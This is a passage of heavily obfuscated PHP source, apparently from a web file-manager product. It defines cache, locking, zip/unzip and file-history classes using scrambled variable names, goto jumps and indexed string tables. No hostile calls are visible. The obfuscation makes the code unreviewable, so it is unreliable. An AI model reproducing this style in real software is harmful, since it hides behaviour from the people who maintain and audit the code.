<?php
 goto D¾ˆù¦Šë; eÜĞîÜ„‹½: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($äñğ¸ë™, $ç¬‹Ãƒƒ) { $äºİØ¿‘ =& $_SERVER[ü¢ÙÊñÛ]; $this->cachePath = $äñğ¸ë™[$äºİØ¿‘[98]]; $this->prefix = $äºİØ¿‘[901]; $this->cacheTime = $ç¬‹Ãƒƒ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($»”ãªûÀ) { $–æ”‰ºÌ =& $_SERVER[ü¢ÙÊñÛ]; $»”ãªûÀ = str_replace(array($–æ”‰ºÌ[902], $–æ”‰ºÌ[111], $–æ”‰ºÌ[87]), $–æ”‰ºÌ[903], $»”ãªûÀ); return $this->cachePath . $–æ”‰ºÌ[904] . $»”ãªûÀ . $–æ”‰ºÌ[905]; } public function set($úõ¼Á, $¶ãÚ…„, $©¤İÕÂ¼ = false) { $©¤İÕÂ¼ = $©¤İÕÂ¼ ? $©¤İÕÂ¼ : $this->cacheTime; $¼„æé•’ = $this->getFile($úõ¼Á); if (file_put_contents($¼„æé•’, $this->prefix . $¶ãÚ…„, LOCK_EX)) { @touch($¼„æé•’, intval(time() + $©¤İÕÂ¼)); clearstatcache(); return !0; } @unlink($¼„æé•’); return !1; } public function get($ÉÑ†Ò–ú) { $æŸû¬İ¹ = $this->getFile($ÉÑ†Ò–ú); if (file_exists($æŸû¬İ¹) && filemtime($æŸû¬İ¹) < time()) { @unlink($æŸû¬İ¹); return !1; } $Í–µ»·á = @file_get_contents($æŸû¬İ¹); return substr($Í–µ»·á, strlen($this->prefix)); } public function remove($âÜàÆ¥) { $áÚ¿İÖ = $this->getFile($âÜàÆ¥); return @unlink($áÚ¿İÖ); } public function deleteAll() { $Îîú†ßë =& $_SERVER[ü¢ÙÊñÛ]; $²£æãÎµ = scandir($this->cachePath); foreach ($²£æãÎµ as $å¬˜í‡) { $»„£Ö¸Ğ = $this->cachePath . $å¬˜í‡; if (strpos($»„£Ö¸Ğ, $Îîú†ßë[905]) && strpos($»„£Ö¸Ğ, $Îîú†ßë[906])) { @unlink($»„£Ö¸Ğ); } } } public function clearTimeout() { $œÓäšù =& $_SERVER[ü¢ÙÊñÛ]; $ÔüŒÂÂı = scandir($this->cachePath); foreach ($ÔüŒÂÂı as $Ü©¾âİ) { $¼ù¾ÔÛ® = $this->cachePath . $Ü©¾âİ; if (strpos($¼ù¾ÔÛ®, $œÓäšù[905]) && strpos($¼ù¾ÔÛ®, $œÓäšù[906]) && filemtime($¼ù¾ÔÛ®) < time()) { @unlink($¼ù¾ÔÛ®); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ŸÂ´… =& $_SERVER[ü¢ÙÊñÛ]; if (self::$handle) { return self::$handle; } $¨ßÄíıµ = $GLOBALS[$ŸÂ´…[16]][$ŸÂ´…[436]]; self::$timeout = $¨ßÄíıµ[$ŸÂ´…[907]] ? $¨ßÄíıµ[$ŸÂ´…[907]] : 10; $ñ¤ÃÑé— = _get($GLOBALS[$ŸÂ´…[16]], $ŸÂ´…[908]); $‚øØµğÌ = $¨ßÄíıµ[$ŸÂ´…[892]] ? $¨ßÄíıµ[$ŸÂ´…[892]] : $ŸÂ´…[243]; if ($‚øØµğÌ == $ŸÂ´…[31] && $ñ¤ÃÑé— == $ŸÂ´…[23]) { $‚øØµğÌ = $ŸÂ´…[243]; } switch ($‚øØµğÌ) { case $ŸÂ´…[895]: self::$handle = new CacheLockRedis(); break; case $ŸÂ´…[896]: self::$handle = new CacheLockMemcached(); break; case $ŸÂ´…[31]: self::$handle = new CacheLockDatabase(); break; case $ŸÂ´…[243]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ŸÂ´…[909], $ŸÂ´…[910]); } return self::$handle; } private static function key($šêº­µÍ) { return $_SERVER[ü¢ÙÊñÛ][911] . Cache::key($šêº­µÍ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ˆÏõûœŞ = '') { self::$errorMsg = $ˆÏõûœŞ; } public static function lockGlobal($°Ä¢±©Ã, $…¥øÏŠ) { return self::lock($°Ä¢±©Ã, $…¥øÏŠ, !0); } public static function lock($À¥´´§, $ÁìôôÊ = false, $“İ‡Ìº = false) { $¢·Àƒ–Œ =& $_SERVER[ü¢ÙÊñÛ]; $¶ÎüƒùÅ = self::init(); $˜Å ë… = self::key($À¥´´§); $ÁìôôÊ = $ÁìôôÊ ? $ÁìôôÊ : self::$timeout; $èÊ£‚‡ = timeFloat(); if ($GLOBALS[$¢·Àƒ–Œ[912]]) { if (!$¶ÎüƒùÅ->lock($˜Å ë…, 0.2)) { die; } return !0; } $æ¶†ç²Æ = $¶ÎüƒùÅ->lock($˜Å ë…, $ÁìôôÊ); $§Š¸ú¡ü = timeFloat(); if (!$æ¶†ç²Æ) { $½°‚à•« = "\154\x6f\x63\x6b\40\145\x72\x72\157\x72\x3b\153\x65\x79\75{$À¥´´§}\73\x74\151\x6d\145\x3d{$ÁìôôÊ}\x3b" . self::$errorMsg . $¢·Àƒ–Œ[85] . get_caller_msg(); $Û¶™µ« = LNG($¢·Àƒ–Œ[913]) . "\50{$ÁìôôÊ}\x73\51\56" . LNG($¢·Àƒ–Œ[914]); $Û¶™µ« .= $¢·Àƒ–Œ[915]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Û¶™µ« = $Û¶™µ« . $¢·Àƒ–Œ[916] . self::$errorMsg; } write_log($¢·Àƒ–Œ[917] . sprintf($¢·Àƒ–Œ[918], timeFloat() - $èÊ£‚‡) . $¢·Àƒ–Œ[919] . $½°‚à•« . $¢·Àƒ–Œ[920] . error_get_last(), $¢·Àƒ–Œ[910]); show_json($Û¶™µ«, !1); } if (!$“İ‡Ìº) { self::$lockItem[$˜Å ë…] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $Şéø½à³ = number_format(timeFloat() - $§Š¸ú¡ü, 3); write_log($¢·Àƒ–Œ[921] . $À¥´´§ . $¢·Àƒ–Œ[922] . $Şéø½à³, $¢·Àƒ–Œ[910]); } return $æ¶†ç²Æ; } public static function lockGet($ÖÑ×ê´¢) { $¿¾È¢„œ = self::key($ÖÑ×ê´¢); if (self::$lockItem[$¿¾È¢„œ]) { return self::$lockItem[$¿¾È¢„œ]; } return self::init()->lockGet($¿¾È¢„œ); } public static function unlock($…ÄæÚ¥Ë) { $Ş¶Üúâˆ =& $_SERVER[ü¢ÙÊñÛ]; $›»Š†›ë = self::key($…ÄæÚ¥Ë); self::$lockItem[$›»Š†›ë] = null; self::init()->unlock($›»Š†›ë); if (GLOBAL_DEBUG_LOG_ALL) { write_log($Ş¶Üúâˆ[923] . $…ÄæÚ¥Ë, $Ş¶Üúâˆ[910]); } return; } public static function unlockRuntime() { $¢ÈÀÀÊÔ =& $_SERVER[ü¢ÙÊñÛ]; $©ˆ˜Íáâ = self::init(); $€¼¬—¹Ù = !1; foreach (self::$lockItem as $ÂÁ¯®ø => $ªíâúâˆ) { if (!$ªíâúâˆ) { continue; } $©ˆ˜Íáâ->unlock($ÂÁ¯®ø); if (!$€¼¬—¹Ù) { $€¼¬—¹Ù = !0; write_log($¢ÈÀÀÊÔ[924] . $ÂÁ¯®ø . $¢ÈÀÀÊÔ[85] . get_caller_msg(), $¢ÈÀÀÊÔ[910]); continue; } write_log($¢ÈÀÀÊÔ[924] . $ÂÁ¯®ø, $¢ÈÀÀÊÔ[910]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $°¨í¨‚ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($¢ÈÀÀÊÔ[925] . $°¨í¨‚ . $¢ÈÀÀÊÔ[926] . ACTION, $¢ÈÀÀÊÔ[910]); } } public static function fileLock($›‡Ø’ÊÌ) { $Ù™Ô±²Å =& $_SERVER[ü¢ÙÊñÛ]; if (!$GLOBALS[$Ù™Ô±²Å[927]]) { $GLOBALS[$Ù™Ô±²Å[927]] = array(); } $GLOBALS[$Ù™Ô±²Å[927]][$›‡Ø’ÊÌ] = !1; $ÊËÔ·¾» = fopen(DATA_PATH . $›‡Ø’ÊÌ . $Ù™Ô±²Å[928], $Ù™Ô±²Å[929]); if (!$ÊËÔ·¾») { return !1; } $GLOBALS[$Ù™Ô±²Å[927]][$›‡Ø’ÊÌ] = $ÊËÔ·¾»; if (flock($ÊËÔ·¾», LOCK_EX)) { return !0; } self::unlock($›‡Ø’ÊÌ); show_json($Ù™Ô±²Å[930], !1); return !1; } public static function fileUnlock($û¡Äı¡€) { $‘«Õ›Ïé =& $_SERVER[ü¢ÙÊñÛ]; $ÂÊÄµØ‹ = $GLOBALS[$‘«Õ›Ïé[927]][$û¡Äı¡€]; if (!$ÂÊÄµØ‹) { return; } $GLOBALS[$‘«Õ›Ïé[927]][$û¡Äı¡€] = !1; flock($ÂÊÄµØ‹, LOCK_UN); fclose($ÂÊÄµØ‹); } public static function fileUnlockAll() { $´¿êö“ =& $_SERVER[ü¢ÙÊñÛ]; if (!isset($GLOBALS[$´¿êö“[927]]) || !$GLOBALS[$´¿êö“[927]]) { return; } foreach ($GLOBALS[$´¿êö“[927]] as $öµòŞ½ => $êºøøÇ) { if (!$êºøøÇ) { continue; } $GLOBALS[$´¿êö“[927]][$öµòŞ½] = !1; flock($êºøøÇ, LOCK_UN); fclose($êºøøÇ); } $GLOBALS[$´¿êö“[927]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto Fêæ ÙÂÄ; c´ï¯¬°Ñ‹: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Ã¸Ÿ“ğ; if ($Ã¸Ÿ“ğ) { return $Ã¸Ÿ“ğ; } $êÁµúÏ£ = IO::init($_SERVER[ü¢ÙÊñÛ][18]); return $êÁµúÏ£; } private static function iconvSystem($¯öüøÄ) { return self::local()->iconvSystem($¯öüøÄ); } private static function iconvApp($ Äœ) { return self::local()->iconvApp($ Äœ); } public static function zipFolder($³¸œßª, $ÙÂá¢ƒ = "\172\151\160", $¬”Û˜ö = '', $ÃªÖ‚§¤ = REPEAT_RENAME) { $¬êê‰˜Õ =& $_SERVER[ü¢ÙÊñÛ]; $’ß²çœĞ = IO::listPath($³¸œßª); if (!$’ß²çœĞ) { return !1; } $’ß²çœĞ = array_merge($’ß²çœĞ[$¬êê‰˜Õ[96]], $’ß²çœĞ[$¬êê‰˜Õ[97]]); return self::zip($’ß²çœĞ, $ÙÂá¢ƒ, $¬”Û˜ö, $ÃªÖ‚§¤); } public static function zip($óÙ­¥²ƒ, $ø™íìÅù = "\x7a\x69\160", $¸ÖÈ÷İİ = '', $ƒÒ¿æõ = REPEAT_RENAME) { $ÌÇ¯·¾¡ =& $_SERVER[ü¢ÙÊñÛ]; if (is_string($óÙ­¥²ƒ) && $óÙ­¥²ƒ) { $óÙ­¥²ƒ = array(array($ÌÇ¯·¾¡[98] => $óÙ­¥²ƒ)); } $úÖá·ÛÅ = self::init($óÙ­¥²ƒ[0][$ÌÇ¯·¾¡[98]]); $Ö“®Ü€  = self::info($óÙ­¥²ƒ[0][$ÌÇ¯·¾¡[98]]); $ÔÄõ¯Ï˜ = $ÌÇ¯·¾¡[22]; $éáà·èº = $ÌÇ¯·¾¡[22]; $şôµÎ¸ = $ÌÇ¯·¾¡[22]; if ($¸ÖÈ÷İİ && substr($¸ÖÈ÷İİ, -1, 1) != $ÌÇ¯·¾¡[18]) { $éáà·èº = get_path_father($¸ÖÈ÷İİ); $şôµÎ¸ = get_path_this($¸ÖÈ÷İİ); } else { $éáà·èº = self::pathFather($Ö“®Ü€ [$ÌÇ¯·¾¡[98]]); $şôµÎ¸ = $Ö“®Ü€ [$ÌÇ¯·¾¡[42]] . $ÌÇ¯·¾¡[20] . $ø™íìÅù; if (count($óÙ­¥²ƒ) > 1) { $‹±ğ°õË = IO::info($éáà·èº); $şôµÎ¸ = $‹±ğ°õË[$ÌÇ¯·¾¡[42]] . $ÌÇ¯·¾¡[20] . $ø™íìÅù; } if ($¸ÖÈ÷İİ) { $éáà·èº = $¸ÖÈ÷İİ; } } if ($úÖá·ÛÅ->getType() == $ÌÇ¯·¾¡[120]) { $Æú¢Øë¯ = self::init($éáà·èº); $ÃÊìĞİß = $Æú¢Øë¯->getType() == $ÌÇ¯·¾¡[120] ? $éáà·èº : get_path_father($úÖá·ÛÅ->path); $ÃÊìĞİß = rtrim($ÃÊìĞİß, $ÌÇ¯·¾¡[18]) . $ÌÇ¯·¾¡[18]; mk_dir($ÃÊìĞİß); } else { $ÔÄõ¯Ï˜ = TEMP_FILES . $ÌÇ¯·¾¡[1254] . time() . rand_string(8) . $ÌÇ¯·¾¡[18]; mk_dir($ÔÄõ¯Ï˜); file_put_contents($ÔÄõ¯Ï˜ . $ÌÇ¯·¾¡[1255], $ÌÇ¯·¾¡[22]); $ÃÊìĞİß = $ÔÄõ¯Ï˜; } $ƒÜ´Ğ¤ = IO::info($ÃÊìĞİß); if (!$ƒÜ´Ğ¤ || !$ƒÜ´Ğ¤[$ÌÇ¯·¾¡[246]]) { show_json(LNG($ÌÇ¯·¾¡[1256]), !1); } $íøò£ä¹ = self::zipFileList($óÙ­¥²ƒ, $ÔÄõ¯Ï˜); foreach ($íøò£ä¹ as $ÁÕ¨—àÔ => $½ÏÈÏó) { $íøò£ä¹[$ÁÕ¨—àÔ] = self::iconvSystem($½ÏÈÏó); } $´×÷‰Í£ = get_filename_auto($ÃÊìĞİß . $şôµÎ¸, $ÌÇ¯·¾¡[22], $ƒÒ¿æõ); KodArchive::create(self::iconvSystem($´×÷‰Í£), $íøò£ä¹); if (!IO::exist($´×÷‰Í£)) { if ($ÔÄõ¯Ï˜) { del_dir($ÔÄõ¯Ï˜); } write_log($ÌÇ¯·¾¡[1257] . $´×÷‰Í£, $ÌÇ¯·¾¡[400]); show_json(LNG($ÌÇ¯·¾¡[1258]), !1); } if (!$ÔÄõ¯Ï˜) { return $´×÷‰Í£; } $ı„¼¼‘ = self::move($´×÷‰Í£, $éáà·èº, $ƒÒ¿æõ); if ($ÔÄõ¯Ï˜) { del_dir($ÔÄõ¯Ï˜); } if (!$´×÷‰Í£) { write_log($ÌÇ¯·¾¡[1259] . $´×÷‰Í£ . $ÌÇ¯·¾¡[1260] . $éáà·èº, $ÌÇ¯·¾¡[400]); show_json(LNG($ÌÇ¯·¾¡[1258]), !1); } return $ı„¼¼‘; } public static function unzip($šìØîúÊ, $ªÈÊ¬µÊ, $ö»Ö©¬™ = "\x2d\x31", $Ëâ÷ÀÔ = "\162\x65\x70\154\x61\143\x65") { $®™´ö‰Ô =& $_SERVER[ü¢ÙÊñÛ]; $Ó»Æ›‡— = parent::info($šìØîúÊ); if (!$Ó»Æ›‡—) { show_json(LNG($®™´ö‰Ô[1261]), !1); } $Õ’×¹ğ‘ = IO::infoFullSimple($ªÈÊ¬µÊ); if (!$Õ’×¹ğ‘) { $ªÈÊ¬µÊ = IO::mkdir($ªÈÊ¬µÊ); } if (isset($Õ’×¹ğ‘[$®™´ö‰Ô[204]]) && trim($Õ’×¹ğ‘[$®™´ö‰Ô[98]], $®™´ö‰Ô[18]) != trim($ªÈÊ¬µÊ, $®™´ö‰Ô[18])) { $®‹±¡Á§ = KodIO::make($Õ’×¹ğ‘[$®™´ö‰Ô[203]]); $¼ûáæ–Ø = IO::fileNameAuto($®‹±¡Á§, $Õ’×¹ğ‘[$®™´ö‰Ô[42]], REPEAT_RENAME_FOLDER, !0); $ªÈÊ¬µÊ = IO::mkdir($®‹±¡Á§ . $¼ûáæ–Ø); } $ö»Ö©¬™ = $ö»Ö©¬™ && $ö»Ö©¬™ != $®™´ö‰Ô[1262] ? @json_decode($ö»Ö©¬™, !0) : -1; $‚©îø = self::unzipPart($šìØîúÊ, $ö»Ö©¬™); if (!$‚©îø || !IO::exist($‚©îø[$®™´ö‰Ô[243]])) { show_json(LNG($®™´ö‰Ô[119]), !1); } $ö¯·Ì = $‚©îø[$®™´ö‰Ô[1263]][count($‚©îø[$®™´ö‰Ô[1263]]) - 1]; if ($ö¯·Ì[$®™´ö‰Ô[1264]] == -1 || substr($ö¯·Ì[$®™´ö‰Ô[42]], -1, 1) == $®™´ö‰Ô[18]) { $ñÚ–üŒ = $‚©îø[$®™´ö‰Ô[1265]] . rand_string(10) . $®™´ö‰Ô[18]; mk_dir($ñÚ–üŒ); $‹³Äƒì = count($‚©îø[$®™´ö‰Ô[1263]]) == 1 ? IO::ext($šìØîúÊ) : get_path_ext($‚©îø[$®™´ö‰Ô[243]]); $İñåµ¹Ù = KodArchive::extract(self::iconvSystem($‚©îø[$®™´ö‰Ô[243]]), $ñÚ–üŒ, $ö¯·Ì[$®™´ö‰Ô[1264]], $¼ûáæ–Ø, $‹³Äƒì); self::unzipErrorCheck($İñåµ¹Ù, array($®™´ö‰Ô[1266], $šìØîúÊ, $‹³Äƒì, $ªÈÊ¬µÊ, $‚©îø)); Hook::trigger($®™´ö‰Ô[1267], $ñÚ–üŒ); recursion_dir($ñÚ–üŒ, $çğ¬İŸ, $È’…’Ã¡, 0); $ÔˆùÖØš = array_merge($çğ¬İŸ, $È’…’Ã¡); $ˆ„ÓôËİ = array(); foreach ($ÔˆùÖØš as $¡ßµ¶¯Ù) { $ìÂáÑ˜¸ = IO::move(self::iconvApp($¡ßµ¶¯Ù), $ªÈÊ¬µÊ, $Ëâ÷ÀÔ); if ($ìÂáÑ˜¸) { $ˆ„ÓôËİ[] = $ìÂáÑ˜¸; } } del_dir($ñÚ–üŒ); } else { $ìÂáÑ˜¸ = IO::move($‚©îø[$®™´ö‰Ô[243]], $ªÈÊ¬µÊ, $Ëâ÷ÀÔ, get_path_this($ö¯·Ì[$®™´ö‰Ô[42]])); if ($ìÂáÑ˜¸) { $ˆ„ÓôËİ[] = $ìÂáÑ˜¸; } } return $ˆ„ÓôËİ ? $ˆ„ÓôËİ : !1; } public static function unzipList($’¥ˆüÁ) { $ó´İÅ¥£ =& $_SERVER[ü¢ÙÊñÛ]; $ñ¡•ÆÖ’ = isset($’¥ˆüÁ[$ó´İÅ¥£[1268]]) ? $’¥ˆüÁ[$ó´İÅ¥£[1268]] : !1; $Ë»šÕØå = isset($’¥ˆüÁ[$ó´İÅ¥£[1264]]) ? @json_decode($’¥ˆüÁ[$ó´İÅ¥£[1264]], !0) : -1; $³š€œ = self::unzipPart($’¥ˆüÁ[$ó´İÅ¥£[98]], $Ë»šÕØå); if (!$³š€œ || !IO::exist($³š€œ[$ó´İÅ¥£[243]])) { show_json(LNG($ó´İÅ¥£[119]), !1); } $Ş„ÍÎ£¨ = $³š€œ[$ó´İÅ¥£[1263]][count($³š€œ[$ó´İÅ¥£[1263]]) - 1]; $å’Áéí‘ = in_array(IO::ext($³š€œ[$ó´İÅ¥£[243]]), array($ó´İÅ¥£[400], $ó´İÅ¥£[1269], $ó´İÅ¥£[1270], $ó´İÅ¥£[1271], $ó´İÅ¥£[1272], $ó´İÅ¥£[1273])); if (!$ñ¡•ÆÖ’ && ($Ş„ÍÎ£¨[$ó´İÅ¥£[1264]] == -1 || $å’Áéí‘)) { $¦½úú½  = $³š€œ[$ó´İÅ¥£[1265]] . get_path_this($³š€œ[$ó´İÅ¥£[243]]) . $ó´İÅ¥£[1274]; if (!IO::exist($¦½úú½ )) { $÷Š¹Î½è = $Ş„ÍÎ£¨[$ó´İÅ¥£[1264]] == -1 ? get_path_ext(IO::pathThis($’¥ˆüÁ[$ó´İÅ¥£[98]])) : get_path_ext($³š€œ[$ó´İÅ¥£[243]]); $¥öÎˆÑ¥ = KodArchive::listContent(self::iconvSystem($³š€œ[$ó´İÅ¥£[243]]), !0, $÷Š¹Î½è); self::unzipErrorCheck($¥öÎˆÑ¥, array($ó´İÅ¥£[1275], $’¥ˆüÁ, $³š€œ)); @file_put_contents($¦½úú½ , json_encode($¥öÎˆÑ¥[$ó´İÅ¥£[1276]])); } return @json_decode(IO::getContent($¦½úú½ ), !0); } IO::fileOut($³š€œ[$ó´İÅ¥£[243]], $ñ¡•ÆÖ’, get_path_this($Ş„ÍÎ£¨[$ó´İÅ¥£[42]])); die; } private static function zipFileList($ñÌ£Õ®©, $â–ØŸÕå = false) { $ÏğÆÚòÀ =& $_SERVER[ü¢ÙÊñÛ]; $ë¸ö—¯Ú = array(); foreach ($ñÌ£Õ®© as $ñÍ“îÒ) { $±À§ÈÈÎ = $ñÍ“îÒ[$ÏğÆÚòÀ[98]]; if ($â–ØŸÕå) { $±À§ÈÈÎ = self::copy($ñÍ“îÒ[$ÏğÆÚòÀ[98]], $â–ØŸÕå, $ÏğÆÚòÀ[884]); } else { $à¶Íï¶ = self::init($ñÍ“îÒ[$ÏğÆÚòÀ[98]]); if ($à¶Íï¶->getType() == $ÏğÆÚòÀ[120]) { $±À§ÈÈÎ = $à¶Íï¶->path; } } if ($±À§ÈÈÎ && self::local()->exist($±À§ÈÈÎ)) { $ë¸ö—¯Ú[$ñÍ“îÒ[$ÏğÆÚòÀ[98]]] = $±À§ÈÈÎ; } } if (!empty($ë¸ö—¯Ú)) { return array_values($ë¸ö—¯Ú); } show_json(LNG($ÏğÆÚòÀ[1235]), !1); } private static function localFilePath($Ü¯˜°²æ) { $ÒŸ‹»«§ =& $_SERVER[ü¢ÙÊñÛ]; $Àğî˜ = KodIO::parse($Ü¯˜°²æ); if ($Àğî˜[$ÒŸ‹»«§[43]] == KodIO::KOD_SOURCE) { $ä‚¿…ô‘ = Model($ÒŸ‹»«§[890])->fileInfoGet(KodIO::sourceID($Ü¯˜°²æ)); if (!$ä‚¿…ô‘[$ÒŸ‹»«§[98]]) { show_json($ÒŸ‹»«§[1277], !1); } $Ü¯˜°²æ = $ä‚¿…ô‘[$ÒŸ‹»«§[98]]; } $¢¦¡²„ = self::init($Ü¯˜°²æ); if ($¢¦¡²„->pathParse[$ÒŸ‹»«§[1221]]) { $Ü¯˜°²æ = $¢¦¡²„->pathParse[$ÒŸ‹»«§[1221]]; $¢¦¡²„ = self::init($Ü¯˜°²æ); } $Íî¾•µÙ = $¢¦¡²„->getType(); if ($Íî¾•µÙ == $ÒŸ‹»«§[120] || $Íî¾•µÙ == $ÒŸ‹»«§[1278]) { if (!$¢¦¡²„->exist($¢¦¡²„->path)) { show_json(LNG($ÒŸ‹»«§[119]), !1); } return $¢¦¡²„->path; } return !1; } public static function unzipPart($¨ïÅÆì±, $û‡»Æ®á = -1) { $ÀğßÇÛ =& $_SERVER[ü¢ÙÊñÛ]; $‡­‡š¼ = IO::pathThis($¨ïÅÆì±); if (!$û‡»Æ®á || $û‡»Æ®á == -1) { $ÆŸºÚİ = array(array($ÀğßÇÛ[42] => $‡­‡š¼, $ÀğßÇÛ[1264] => -1)); $ÆŸºÚİ[0][$ÀğßÇÛ[1279]] = $ÆŸºÚİ[0][$ÀğßÇÛ[42]]; } else { if (is_array($û‡»Æ®á)) { $ÆŸºÚİ = $û‡»Æ®á; $ÑŠÀ¿° = count($ÆŸºÚİ) - 1; for ($¤ôÌÁßÎ = 0; $¤ôÌÁßÎ <= $ÑŠÀ¿°; $¤ôÌÁßÎ++) { $Õ˜ÈÒ¢ = $ÆŸºÚİ[$¤ôÌÁßÎ]; $§æİ„«í = get_path_this($Õ˜ÈÒ¢[$ÀğßÇÛ[42]]) . (checkExtSafe($Õ˜ÈÒ¢[$ÀğßÇÛ[42]]) ? $ÀğßÇÛ[22] : $ÀğßÇÛ[1280]); $ÆŸºÚİ[$¤ôÌÁßÎ][$ÀğßÇÛ[1279]] = $ÀğßÇÛ[1281] . intval($Õ˜ÈÒ¢[$ÀğßÇÛ[1264]]) . $ÀğßÇÛ[473] . $§æİ„«í; if ($¤ôÌÁßÎ == 0) { continue; } $ÆŸºÚİ[$¤ôÌÁßÎ][$ÀğßÇÛ[1279]] = $ÆŸºÚİ[$¤ôÌÁßÎ - 1][$ÀğßÇÛ[1279]] . $ÀğßÇÛ[1282] . $ÆŸºÚİ[$¤ôÌÁßÎ][$ÀğßÇÛ[1279]]; } } } if (!is_array($ÆŸºÚİ) || count($ÆŸºÚİ) == 0) { return !1; } $§Â–”‰ = $ÆŸºÚİ[count($ÆŸºÚİ) - 1]; if (!IO::exist($¨ïÅÆì±)) { return !1; } $ê¥òÎ§À = TEMP_FILES . $ÀğßÇÛ[1283] . kodIO::hashPathSafe($¨ïÅÆì±) . $ÀğßÇÛ[18]; $—ˆõÊŞ¬ = $ê¥òÎ§À . $§Â–”‰[$ÀğßÇÛ[1279]]; mk_dir($ê¥òÎ§À); file_put_contents(TEMP_FILES . $ÀğßÇÛ[1255], $ÀğßÇÛ[22]); if (IO::exist($—ˆõÊŞ¬)) { return array($ÀğßÇÛ[243] => $—ˆõÊŞ¬, $ÀğßÇÛ[1263] => $ÆŸºÚİ, $ÀğßÇÛ[1265] => $ê¥òÎ§À); } $¼ÖÒ‹ÊÌ = self::localFilePath($¨ïÅÆì±); if (!$¼ÖÒ‹ÊÌ) { $¼ÖÒ‹ÊÌ = $ê¥òÎ§À . $ÀğßÇÛ[1284]; if (!IO::exist($¼ÖÒ‹ÊÌ)) { self::copy($¨ïÅÆì±, $ê¥òÎ§À, !1, get_path_this($¼ÖÒ‹ÊÌ)); } } if (!$¼ÖÒ‹ÊÌ || !IO::exist($¼ÖÒ‹ÊÌ)) { return !1; } if ($§Â–”‰[$ÀğßÇÛ[1264]] == -1) { return array($ÀğßÇÛ[243] => $¼ÖÒ‹ÊÌ, $ÀğßÇÛ[1263] => $ÆŸºÚİ, $ÀğßÇÛ[1265] => $ê¥òÎ§À); } $ãöàÜË´ = $¼ÖÒ‹ÊÌ; foreach ($ÆŸºÚİ as $¤ôÌÁßÎ => $Õ˜ÈÒ¢) { if (!$Õ˜ÈÒ¢ || $Õ˜ÈÒ¢[$ÀğßÇÛ[1264]] == $ÀğßÇÛ[1262]) { break; } if (substr($Õ˜ÈÒ¢[$ÀğßÇÛ[42]], -1, 1) == $ÀğßÇÛ[18]) { break; } $ƒ¡Àì±© = in_array(get_path_ext($Õ˜ÈÒ¢[$ÀğßÇÛ[1279]]), array($ÀğßÇÛ[400], $ÀğßÇÛ[1269], $ÀğßÇÛ[1270], $ÀğßÇÛ[1271], $ÀğßÇÛ[1272], $ÀğßÇÛ[1273])); $ñö†êÂà = $¤ôÌÁßÎ == count($ÆŸºÚİ) - 1 && $ƒ¡Àì±©; $Ñîé¡ä‘ = $ê¥òÎ§À . $Õ˜ÈÒ¢[$ÀğßÇÛ[1279]]; $¶Üùï = $ê¥òÎ§À . get_path_this($Õ˜ÈÒ¢[$ÀğßÇÛ[42]]); if (IO::exist($Ñîé¡ä‘)) { $ãöàÜË´ = $Ñîé¡ä‘; continue; } $“ÂåˆÔ¼ = $¤ôÌÁßÎ == 0 ? get_path_ext($‡­‡š¼) : get_path_ext($ãöàÜË´); $»ÜõÚÈ = KodArchive::extract(self::iconvSystem($ãöàÜË´), $ê¥òÎ§À, $Õ˜ÈÒ¢[$ÀğßÇÛ[1264]], $Ôğ®¶¼, $“ÂåˆÔ¼); self::unzipErrorCheck($»ÜõÚÈ, array($ÀğßÇÛ[1285], $¨ïÅÆì±, $ÆŸºÚİ, $Õ˜ÈÒ¢, $Ñîé¡ä‘)); if (IO::exist($¶Üùï)) { IO::rename($¶Üùï, get_path_this($Ñîé¡ä‘)); } $ãöàÜË´ = $Ñîé¡ä‘; } $—ˆõÊŞ¬ = $ãöàÜË´; return array($ÀğßÇÛ[243] => $ãöàÜË´, $ÀğßÇÛ[1263] => $ÆŸºÚİ, $ÀğßÇÛ[1265] => $ê¥òÎ§À); } private static function unzipErrorCheck($ñÌæµ÷¤, $î‹¬ş¥¨ = false) { $Åƒã   =& $_SERVER[ü¢ÙÊñÛ]; if ($ñÌæµ÷¤[$Åƒã  [1286]]) { return !0; } write_log(array($Åƒã  [1287], $ñÌæµ÷¤, $î‹¬ş¥¨), $Åƒã  [1288]); show_json($Åƒã  [1289] . json_encode($ñÌæµ÷¤[$Åƒã  [1276]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ŒéàŒƒô =& $_SERVER[ü¢ÙÊñÛ]; $¶ˆÓ‘ç· = $GLOBALS[$ŒéàŒƒô[16]][$ŒéàŒƒô[103]]; if ($¶ˆÓ‘ç·[$ŒéàŒƒô[1290]] != 1) { return; } if ($¶ˆÓ‘ç·[$ŒéàŒƒô[1291]] <= 0) { return; } if (isset($_REQUEST[$ŒéàŒƒô[1292]]) && $_REQUEST[$ŒéàŒƒô[1292]] == $ŒéàŒƒô[102]) { return; } Hook::bind($ŒéàŒƒô[1293], $ŒéàŒƒô[1294]); Hook::bind($ŒéàŒƒô[1295], $ŒéàŒƒô[1296]); Hook::bind($ŒéàŒƒô[1297], $ŒéàŒƒô[1298]); Hook::bind($ŒéàŒƒô[1299], $ŒéàŒƒô[1300]); Hook::bind($ŒéàŒƒô[1301], $ŒéàŒƒô[1302]); Hook::bind($ŒéàŒƒô[1303], $ŒéàŒƒô[1304]); } public static function eventBeforeUpload($ßÂÕşø) { if ($ßÂÕşø[3] && $ßÂÕşø[3] != REPEAT_REPLACE) { return; } $©¼õÁè§ = self::parsePath($ßÂÕşø[0]); if (!$©¼õÁè§) { return; } self::add($©¼õÁè§); } public static function eventBeforeEdit($Æ¬ãÒÀ) { $Ö¾Ô”Ö” = self::parsePath($Æ¬ãÒÀ[0]); if (!$Ö¾Ô”Ö”) { return; } self::add($Ö¾Ô”Ö”); } public static function eventBeforeCopyFile($‹Ô§Ù¢ê, $‚şğÓ€¤, $ÜôÅıØŸ, $×Œ§ƒØ, $×À³¥, 